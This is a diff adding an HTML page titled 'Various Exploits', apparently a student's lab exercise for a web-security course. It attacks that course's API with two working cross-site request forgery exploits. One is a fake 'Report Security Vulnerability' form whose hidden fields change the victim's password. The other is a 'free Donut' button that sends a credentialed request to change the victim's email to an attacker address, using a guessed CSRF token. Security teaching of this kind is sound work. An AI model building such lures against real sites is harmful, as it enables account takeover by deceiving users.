@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Change Password CSRF</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
+</head>
+<body class="px-2">
+    <div class="container text-center mt-3">
+        <h1 class="display-2">Various Exploits</h1>
+
+    </div>
+    <div class="container-sm pt-5">
+        <!-- Change Passowrd CSRF Exploitation -->
+        <small class="badge rounded-pill text-bg-danger">Change Password CSRF</small>
+        <div class="border border-4 border-danger p-5 mt-2">
+            <h1>Report Security Vulnerability</h1>
+            <form method="post" action="https://m183.gibz-informatik.ch/api/csrf/changePassword" >
+                <input hidden id="username" name="username" value="gipe2" />
+                <input hidden name="password" value="Pa$$w0rd" />
+    
+                <label for="inputPassword5" class="form-label">Report Reason</label>
+                <input type="text" id="inputPassword5" class="form-control" aria-describedby="passwordHelpBlock">
+                <div id="passwordHelpBlock" class="form-text pb-4">
+                Please input your report reason
+                </div>
+    
+                <label for="inputPassword6" class="form-label">Report Body</label>
+                <input type="text" id="inputPassword6" class="form-control" aria-describedby="passwordHelpBlock2">
+                <div id="passwordHelpBlock2" class="form-text pb-4">
+                Please input your report body
+                </div>
+    
+                <button type="submit" class="btn btn-primary">Submit</button>
+            </form>
+        </div>
+    </div>
+    <div class="container-sm pt-5">
+        <!-- Change Email CSRF Exploitation -->
+        <small class="badge rounded-pill text-bg-danger">Change Email CSRF</small>
+        <div class="border border-4 border-danger p-5 mt-2">
+            <button type="button" class="btn btn-primary" id="donut-life" data-bs-toggle="modal" data-bs-target="#donutWin">Get a free Donut 🍩</button>       
+        </div>
+    </div>
+    <div class="mb-5" style="height: 10rem;"></div>
+    <div class="modal fade" id="donutWin" aria-hidden="true" aria-labelledby="donutWinLabel" tabindex="-1">
+        <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
+            <div class="modal-dialog">
+                <div class="modal-content">
+                  <div class="modal-header">
+                    <h1 class="modal-title fs-5" id="donutWinLabel">Modal title</h1>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                  </div>
+                  <div class="modal-body">
+                    Congratulations!! Here is your free Donut:
+                    <br>
+                    <h1>🍩</h1>
+                  </div>
+                  <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                  </div>
+                </div>
+              </div>                
+        </div>       
+    </div>
+    <script>
+        // For "Change Password CSRF Exploit"
+        async function getUsername() {
+            const res = await fetch('https://m183.gibz-informatik.ch/api/csrf/getUsername', {
+                mode: 'cors',
+                credentials: 'include'
+            });
+            const username= await res.text();
+            document.getElementById("username").value = username;
+            console.log('found username', username)
+        }
+
+        getUsername()
+
+        // For "Change Email CSRF Exploit"
+        async function generateCsrf() {
+            const digest = await digestMessage((new Date()).getMilliseconds().toString())
+            const csrf_token = digest.substr(0, 20)
+            return csrf_token
+          }
+        
+        async function digestMessage(message) {
+            const msgUint8 = new TextEncoder().encode(message);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+          }
+
+        async function changeEmail() {
+
+            const form_json = JSON.stringify(
+                {
+                    csrf: await generateCsrf(),
+                    email: "pwnd@gibz.ch"
+                }
+            )
+            const res = await fetch("https://m183.gibz-informatik.ch/api/csrf/changeEmail", {
+                "headers": {
+                  "accept": "application/json, text/plain, */*",
+                  "content-type": "application/json;charset=UTF-8",
+                },
+                "body": form_json,
+                "method": "POST",
+                "mode": "cors",
+                "credentials": "include"
+              })
+
+            if (res.ok) {
+                console.log("Email changed successfully")
+            } else {
+                console.log("Failure in changin email")
+            }
+        }
+
+        document.getElementById("donut-life").addEventListener("click", () => {
+            changeEmail()
+        })
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>
+</body>
+</html>
